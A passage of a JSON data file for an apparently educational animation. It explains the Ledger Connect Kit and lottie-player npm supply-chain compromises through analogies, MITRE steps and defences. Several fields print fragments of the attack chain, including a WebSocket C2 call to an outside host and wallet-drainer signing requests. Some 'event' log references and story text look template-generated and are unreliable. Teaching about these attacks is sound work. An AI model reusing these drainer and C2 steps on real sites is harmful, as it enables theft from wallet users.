          "title": "Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7",
          "storyExcerpt": "By sending a convincing phishing lure to a former worker whose warehouse publishing badge was never revoked during offboarding, the thief walks into the parts registry and stamps three poisoned release…",
          "technicalParallel": "Auditing the npm registry metadata against GitHub showed that versions 1.1.5–1.1.7 had no corresponding Git tags, pull requests, or GitHub Actions release runs in Ledger’s source repository.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Down List",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader",
          "storyExcerpt": "Even partner shops that carefully bolted down their own local parts list still relied on a tiny starter loader that automatically fetches whatever newest edition sits on the public delivery truck…",
          "technicalParallel": "This design bypassed build-time dependency pinning completely: every time a user loaded a dApp frontend in their browser, the browser fetched the latest 1.x build directly from cdn.jsdelivr.net.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Page Pad",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain",
          "storyExcerpt": "When a customer clicks connect on a trusted finance page, the hijacked connector slides a pixel-perfect counterfeit signature pad in front of them. Instead of approving a routine check-in, the customer…",
          "technicalParallel": "Ledger hardware wallets themselves remained secure, but users who blindly approved the malicious transaction prompt on their wallet screen authorized the transfer; Ledger and WalletConnect contained the…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Publish Kiosk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wallet Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "CDN Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "ledger-connect-kit-npmjs-drainer",
      "sectionKey": "step-1",
      "sceneKind": "sup-ledger-kit-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7",
      "storyCue": "By sending a convincing phishing lure to a former worker whose warehouse publishing badge was never revoked during offboarding, the thief walks into the parts registry and stamps three poisoned release editions right onto the official brand shelf.",
      "technicalCue": "T1195.001 · INITIAL ACCESS — After spear-phishing a former employee whose npmjs account had not been removed from the @ledgerhq organization during offboarding, the attacker generated an npm access token and published…",
      "storyMappings": [
        {
          "storyTerm": "Former worker badge never revoked at offboarding",
          "technicalTerm": "Active npmjs maintainer rights left on a former Ledger employee account",
          "tone": "amber"
        },
        {
          "storyTerm": "Convincing phishing lure",
          "technicalTerm": "Spear-phishing campaign harvesting the former employee NPM credentials",
          "tone": "sky"
        },
        {
          "storyTerm": "Three poisoned release editions on the official shelf",
          "technicalTerm": "Published @ledgerhq/connect-kit versions 1.1.5, 1.1.6, and 1.1.7",
          "tone": "rose"
        },
        {
          "storyTerm": "Hidden payload packed inside the connector",
          "technicalTerm": "Angel Drainer JavaScript bundle embedded in the official package release",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-ledger-kit-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Former worker badge never revoked at…",
          "subtitle": "Active npmjs maintainer rights left on a former Ledger…",
          "tone": "amber"
        },
        {
          "id": "sup-ledger-kit-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Convincing phishing lure",
          "subtitle": "Spear-phishing campaign harvesting the former employee NPM…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Lure",
          "stageTag": "STEP 01 · SETUP",
          "title": "Former worker badge never revoked at offboarding",
          "storyExcerpt": "By sending a convincing phishing lure to a former worker whose warehouse publishing badge was never revoked during offboarding, the thief walks into the parts registry and stamps three poisoned…",
          "technicalParallel": "Auditing the npm registry metadata against GitHub showed that versions 1.1.5–1.1.7 had no corresponding Git tags, pull requests, or GitHub Actions release runs in Ledger’s source repository.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Lure",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Convincing phishing lure",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses convincing phishing lure to advance toward three poisoned release editions on the official shelf.",
          "technicalParallel": "After spear-phishing a former employee whose npmjs account had not been removed from the @ledgerhq organization during offboarding, the attacker generated an npm access token and published…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Lure Onto",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Hidden payload packed inside the connector",
          "storyExcerpt": "Behind the scenes, hidden payload packed inside the connector captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Registry monitors (Socket / Checkmarx / Phylum) alerting when an npm package version is published without a matching GitHub tag or OIDC provenance attestation.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Publish Kiosk",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wallet Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "CDN Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.001"
    },
    "step-2": {
      "scenarioId": "ledger-connect-kit-npmjs-drainer",
      "sectionKey": "step-2",
      "sceneKind": "sup-ledger-kit-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader",
      "storyCue": "Even partner shops that carefully bolted down their own local parts list still relied on a tiny starter loader that automatically fetches whatever newest edition sits on the public delivery truck, spreading the poisoned module across hundreds of live finance storefronts in minutes.",
      "technicalCue": "T1059.007 · EXECUTION — Even dApps that pinned their own package-lock.json were impacted because @ledgerhq/connect-kit-loader was designed to dynamically load <script…",
      "storyMappings": [
        {
          "storyTerm": "Partner shops that bolted down their local parts list",
          "technicalTerm": "DeFi frontends with locked local package-lock.json files",
          "tone": "amber"
        },
        {
          "storyTerm": "Tiny starter loader fetching the newest edition automatically",
          "technicalTerm": "@ledgerhq/connect-kit-loader pulling unpinned jsDelivr @1 CDN bundle",
          "tone": "sky"
        },
        {
          "storyTerm": "Public delivery truck",
          "technicalTerm": "cdn.jsdelivr.net serving newly published npm versions within minutes",
          "tone": "rose"
        },
        {
          "storyTerm": "Hundreds of live finance storefronts poisoned at once",
          "technicalTerm": "Simultaneous downstream impact across SushiSwap, Revoke.cash, and Web3 dApps",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-ledger-kit-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Partner shops that bolted down their…",
          "subtitle": "DeFi frontends with locked local package-lock.json files",
          "tone": "amber"
        },
        {
          "id": "sup-ledger-kit-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Tiny starter loader fetching the newest…",
          "subtitle": "@ledgerhq/connect-kit-loader pulling unpinned jsDelivr @1 CDN…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Down List",
          "stageTag": "STEP 02 · SETUP",
          "title": "Partner shops that bolted down their local parts list",
          "storyExcerpt": "Even partner shops that carefully bolted down their own local parts list still relied on a tiny starter loader that automatically fetches whatever newest edition sits on the public delivery…",
          "technicalParallel": "This design bypassed build-time dependency pinning completely: every time a user loaded a dApp frontend in their browser, the browser fetched the latest 1.x build directly from cdn.jsdelivr.net.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tiny",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Tiny starter loader fetching the newest edition…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses tiny starter loader fetching the newest edition automatically to advance toward public delivery truck.",
          "technicalParallel": "Even dApps that pinned their own package-lock.json were impacted because @ledgerhq/connect-kit-loader was designed to dynamically load <script…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Live",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Hundreds of live finance storefronts poisoned at once",
          "storyExcerpt": "Behind the scenes, hundreds of live finance storefronts poisoned at once captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Deploy frontend runtime integrity monitors such as Blockaid (continuous browser-side sensors that hash live third-party scripts and flag DOM mutations) to alert immediately on unexpected script changes…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Publish Kiosk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wallet Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "CDN Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.007"
    },
    "step-3": {
      "scenarioId": "ledger-connect-kit-npmjs-drainer",
      "sectionKey": "step-3",
      "sceneKind": "sup-ledger-kit-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain",
      "storyCue": "When a customer clicks connect on a trusted finance page, the hijacked connector slides a pixel-perfect counterfeit signature pad in front of them. Instead of approving a routine check-in, the customer unknowingly signs a blank power-of-attorney slip handing every asset in their vault straight to the thief.",
      "technicalCue": "T1657 · EXFIL & IMPACT — The injected Angel Drainer payload rendered a fake WalletConnect connection modal using an attacker-controlled WalletConnect Project ID, scanned the connected wallet’s token balances, and…",
      "storyMappings": [
        {
          "storyTerm": "Pixel-perfect counterfeit signature pad",
          "technicalTerm": "Rogue WalletConnect modal rendered using an attacker WalletConnect Project ID",
          "tone": "amber"
        },
        {
          "storyTerm": "Blank power-of-attorney slip",
          "technicalTerm": "Malicious Permit2 eth_signTypedData_v4 and setApprovalForAll signatures",
          "tone": "sky"
        },
        {
          "storyTerm": "Emptying every asset in the customer vault",
          "technicalTerm": "Automated Angel Drainer transfer of ERC-20 tokens and NFTs to drainer addresses",
          "tone": "rose"
        },
        {
          "storyTerm": "Pre-signing vault safety preview",
          "technicalTerm": "Wallet transaction simulation flagging drainer spender contracts before signing",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-ledger-kit-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Pixel-perfect counterfeit signature pad",
          "subtitle": "Rogue WalletConnect modal rendered using an attacker…",
          "tone": "amber"
        },
        {
          "id": "sup-ledger-kit-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Blank power-of-attorney slip",
          "subtitle": "Malicious Permit2 eth_signTypedData_v4 and setApprovalForAll…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Page Pad",
          "stageTag": "STEP 03 · SETUP",
          "title": "Pixel-perfect counterfeit signature pad",
          "storyExcerpt": "When a customer clicks connect on a trusted finance page, the hijacked connector slides a pixel-perfect counterfeit signature pad in front of them.",
          "technicalParallel": "Ledger hardware wallets themselves remained secure, but users who blindly approved the malicious transaction prompt on their wallet screen authorized the transfer; Ledger and WalletConnect contained the…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Slip",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Blank power-of-attorney slip",
          "storyExcerpt": "Instead of approving a routine check-in, the customer unknowingly signs a blank power-of-attorney slip handing every asset in their vault straight to the thief.",
          "technicalParallel": "The injected Angel Drainer payload rendered a fake WalletConnect connection modal using an attacker-controlled WalletConnect Project ID, scanned the connected wallet’s token balances, and prompted the…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Pre-signing",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Pre-signing vault safety preview",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across pre-signing vault safety preview while locking down emptying every asset in the customer vault.",
          "technicalParallel": "Enable wallet-level transaction simulation tools such as Blockaid (which dry-run cryptographic signing prompts before user confirmation) to flag malicious eth_signTypedData_v4 (Permit2) and…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Publish Kiosk",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wallet Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "CDN Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1657"
    }
  },
  "lottie-player-npm-ace-supply-chain-2024": {
    "briefing": {
      "scenarioId": "lottie-player-npm-ace-supply-chain-2024",
      "sectionKey": "briefing",
      "sceneKind": "sup-lottie-npm-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.002",
      "title": "@lottiefiles/lottie-player NPM Supply Chain Compromise, Unpinned CDN… — Story-to-Technical Overview",
      "storyCue": "Imagine an animation studio whose lightweight flipbook player is embedded via an unpinned live delivery link on thousands of websites. An intruder steals a studio publishing pass, pushes three backdoored editions in quick succession so every site loading the live link immediately runs a hidden radio beacon, and uses that live radio to drop a fake glass login sheet directly over trusted finance pages to drain visitor wallets.",
      "technicalCue": "INITIAL ACCESS: Compromised NPM Token Pushes `@lottiefiles/lottie-player` v2.0.5, v2.0.6 & v2.0.7 -> LATERAL & C2: Obfuscated Bundle Execution & WebSocket C2 Handshake (`wss://castleservices.org`) -> EXFIL & IMPACT: Dynamic DOM Overlay Injection & AceDrainer `eth_sendTransaction` / `Permit2` Signing",
      "storyMappings": [
        {
          "storyTerm": "Studio publishing pass pushing three backdoored flipbooks",
          "technicalTerm": "Compromised NPM token publishing @lottiefiles/lottie-player v2.0.5, 2.0.6, and 2.0.7",
          "tone": "amber"
        },
        {
          "storyTerm": "Hidden radio beacon dialing an outside handler",
          "technicalTerm": "Obfuscated bundle opening WebSocket C2 to wss://castleservices.org",
          "tone": "sky"
        },
        {
          "storyTerm": "Fake glass login sheet laid over trusted pages",
          "technicalTerm": "Dynamic DOM modal overlay injected inside victim Web3 applications",
          "tone": "rose"
        },
        {
          "storyTerm": "Draining visitor wallets through the fake sheet",
          "technicalTerm": "AceDrainer eth_sendTransaction and Permit2 malicious signing requests",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-lottie-npm-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Studio publishing pass pushing three…",
          "subtitle": "Compromised NPM token publishing @lottiefiles/lottie-player…",
          "tone": "amber"
        },
        {
          "id": "sup-lottie-npm-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Hidden radio beacon dialing an outside…",
          "subtitle": "Obfuscated bundle opening WebSocket C2 to…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Compromised NPM Token Pushes `@lottiefiles/lottie-player` v2.0.5, v2.0.6 & v2.0.7",
          "storyExcerpt": "Using a stolen studio access token, the intruder uploads three rapid-fire compromised editions of the popular animation player onto the public shelf, banking on thousands of websites that pull the newest…",
          "technicalParallel": "Under the hood, the observed step executes npm publish @lottiefiles/lottie-player@2.0.5 .. 2.0.7 -> Mirrored on https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js (which executes…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Soon Any",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "Obfuscated Bundle Execution & WebSocket C2 Handshake (`wss://castleservices.org`)",
          "storyExcerpt": "As soon as a visitor opens any webpage playing a decorative animation, the hidden code appended to the player opens a live two-way radio channel to an outside command post, asking whether this browser…",
          "technicalParallel": "Under the hood, the observed step executes new WebSocket(\"wss://castleservices.org:8080\") (Establishes real-time C2 from victim browser DOM) (which executes the technical command / telemetry directive…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Over",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Dynamic DOM Overlay Injection & AceDrainer `eth_sendTransaction` / `Permit2` Signing",
          "storyExcerpt": "On cue from the live radio channel, the hijacked animation player drops a crystal-clear counterfeit prompt straight over the trusted storefront window, fooling visitors into signing a sweeping…",
          "technicalParallel": "Under the hood, the observed step executes document.body.appendChild(walletConnectOverlayModal) -> window.ethereum.request({ method: \"eth_signTypedData_v4\", params: [victimAddr, permit2Payload] }) (which…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Flipbook Line",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Radio Beacon",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Package Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "lottie-player-npm-ace-supply-chain-2024",
      "sectionKey": "step-1",
      "sceneKind": "sup-lottie-npm-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Compromised NPM Token Pushes @lottiefiles/lottie-player v2.0.5, v2.0.6 & v2.0.7",
      "storyCue": "Using a stolen studio access token, the intruder uploads three rapid-fire compromised editions of the popular animation player onto the public shelf, banking on thousands of websites that pull the newest major version live without locking a specific version hash.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — Using a compromised maintainer NPM token, the attacker publishes three rapid-fire versions (2.0.5, 2.0.6, and 2.0.7) of @lottiefiles/lottie-player to NPM.",
      "storyMappings": [
        {
          "storyTerm": "Stolen studio access token",
          "technicalTerm": "Compromised @lottiefiles NPM maintainer publish credential",
          "tone": "amber"
        },
        {
          "storyTerm": "Three rapid-fire compromised editions",
          "technicalTerm": "Poisoned @lottiefiles/lottie-player versions 2.0.5, 2.0.6, and 2.0.7",
          "tone": "sky"
        },
        {
          "storyTerm": "Sites pulling the newest edition live without a hash lock",
          "technicalTerm": "Unpinned CDN script tags loading @lottiefiles/lottie-player@latest or @2",
          "tone": "rose"
        },
        {
          "storyTerm": "Appended hidden payload inside the flipbook",
          "technicalTerm": "Obfuscated AceDrainer JavaScript loader bundled into lottie-player.js",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-lottie-npm-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Stolen studio access token",
          "subtitle": "Compromised @lottiefiles NPM maintainer publish credential",
          "tone": "amber"
        },
        {
          "id": "sup-lottie-npm-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Three rapid-fire compromised editions",
          "subtitle": "Poisoned @lottiefiles/lottie-player versions 2.0.5, 2.0.6, and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Onto Pull",
          "stageTag": "STEP 01 · SETUP",
          "title": "Stolen studio access token",
          "storyExcerpt": "Using a stolen studio access token, the intruder uploads three rapid-fire compromised editions of the popular animation player onto the public shelf, banking on thousands of websites that pull…",
          "technicalParallel": "Under the hood, the observed step executes npm publish @lottiefiles/lottie-player@2.0.5 .. 2.0.7 -> Mirrored on https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js (which executes…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Live",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Three rapid-fire compromised editions",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses three rapid-fire compromised editions to advance toward sites pulling the newest edition live without a hash lock.",
          "technicalParallel": "Using a compromised maintainer NPM token, the attacker publishes three rapid-fire versions (2.0.5, 2.0.6, and 2.0.7) of @lottiefiles/lottie-player to NPM.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Live Hash",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Appended hidden payload inside the flipbook",
          "storyExcerpt": "Behind the scenes, appended hidden payload inside the flipbook captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CloudTrail Event 200 (recording PackageName=@lottiefiles/lottie-player, MaliciousVersions=2.0.5, 2.0.6, 2.0.7, CdnVector=Unpinned @latest script tags on unpkg.com & jsDelivr under…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Flipbook Line",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Radio Beacon",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Package Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-2": {
      "scenarioId": "lottie-player-npm-ace-supply-chain-2024",
      "sectionKey": "step-2",
      "sceneKind": "sup-lottie-npm-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "Obfuscated Bundle Execution & WebSocket C2 Handshake (wss://castleservices.org)",
      "storyCue": "As soon as a visitor opens any webpage playing a decorative animation, the hidden code appended to the player opens a live two-way radio channel to an outside command post, asking whether this browser holds valuable digital keys worth targeting.",
      "technicalCue": "T1059.007 · LATERAL & C2 — When a user visits any web application loading the unpinned lottie-player.js script, the obfuscated payload appended to the legitimate animation player executes in the victim’s browser origin…",
      "storyMappings": [
        {
          "storyTerm": "Webpage playing a decorative animation",
          "technicalTerm": "Victim browser loading unpinned lottie-player.js inside a trusted site",
          "tone": "amber"
        },
        {
          "storyTerm": "Live two-way radio channel",
          "technicalTerm": "Outbound WebSocket connection established to wss://castleservices.org",
          "tone": "sky"
        },
        {
          "storyTerm": "Checking for valuable digital keys",
          "technicalTerm": "Browser wallet extension detection (window.ethereum) inside the page context",
          "tone": "rose"
        },
        {
          "storyTerm": "Outside command post directing next moves",
          "technicalTerm": "Remote AceDrainer C2 server issuing real-time DOM overlay instructions",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-lottie-npm-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Webpage playing a decorative animation",
          "subtitle": "Victim browser loading unpinned lottie-player.js inside a…",
          "tone": "amber"
        },
        {
          "id": "sup-lottie-npm-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Live two-way radio channel",
          "subtitle": "Outbound WebSocket connection established to…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Soon Any",
          "stageTag": "STEP 02 · SETUP",
          "title": "Webpage playing a decorative animation",
          "storyExcerpt": "As soon as a visitor opens any webpage playing a decorative animation, the hidden code appended to the player opens a live two-way radio channel to an outside command post, asking whether this…",
          "technicalParallel": "Under the hood, the observed step executes new WebSocket(\"wss://castleservices.org:8080\") (Establishes real-time C2 from victim browser DOM) (which executes the technical command / telemetry directive…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Live Two-way",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Live two-way radio channel",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses live two-way radio channel to advance toward checking for valuable digital keys.",
          "technicalParallel": "When a user visits any web application loading the unpinned lottie-player.js script, the obfuscated payload appended to the legitimate animation player executes in the victim’s browser origin…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Keys",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Outside command post directing next moves",
          "storyExcerpt": "Behind the scenes, outside command post directing next moves captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in SIEM Event 403 (recording InjectedBundle=dist/lottie-player.js , v2.0.5, v2.0.7, WebSocketC2=wss://castleservices.org:8080, WalletDiscovery=window.ethereum & EIP-6963 Provider Enumeration…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Flipbook Line",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Radio Beacon",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Package Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.007"
    },
    "step-3": {
      "scenarioId": "lottie-player-npm-ace-supply-chain-2024",
      "sectionKey": "step-3",
      "sceneKind": "sup-lottie-npm-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Dynamic DOM Overlay Injection & AceDrainer eth_sendTransaction / Permit2 Signing",
      "storyCue": "On cue from the live radio channel, the hijacked animation player drops a crystal-clear counterfeit prompt straight over the trusted storefront window, fooling visitors into signing a sweeping vault-transfer slip under the host site own trusted banner.",
      "technicalCue": "T1185 · EXFIL & IMPACT — Instructed by wss://castleservices.org, the injected script renders a pixel-perfect modal overlay inside the trusted web app’s DOM prompting the user to \"Verify Wallet Connection\", tricking…",
      "storyMappings": [
        {
          "storyTerm": "Crystal-clear counterfeit prompt over the trusted window",
          "technicalTerm": "Injected full-screen AceDrainer modal overlay inside the host DOM",
          "tone": "amber"
        },
        {
          "storyTerm": "Host site own trusted banner",
          "technicalTerm": "Legitimate victim domain URL bar lending visual authenticity to the prompt",
          "tone": "sky"
        },
        {
          "storyTerm": "Sweeping vault-transfer slip",
          "technicalTerm": "Crafted eth_sendTransaction and Permit2 approval prompts sent to the wallet",
          "tone": "rose"
        },
        {
          "storyTerm": "Direct asset transfer to the attacker",
          "technicalTerm": "On-chain draining of user tokens immediately upon wallet signature",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-lottie-npm-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Crystal-clear counterfeit prompt over…",
          "subtitle": "Injected full-screen AceDrainer modal overlay inside the host…",
          "tone": "amber"
        },
        {
          "id": "sup-lottie-npm-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Host site own trusted banner",
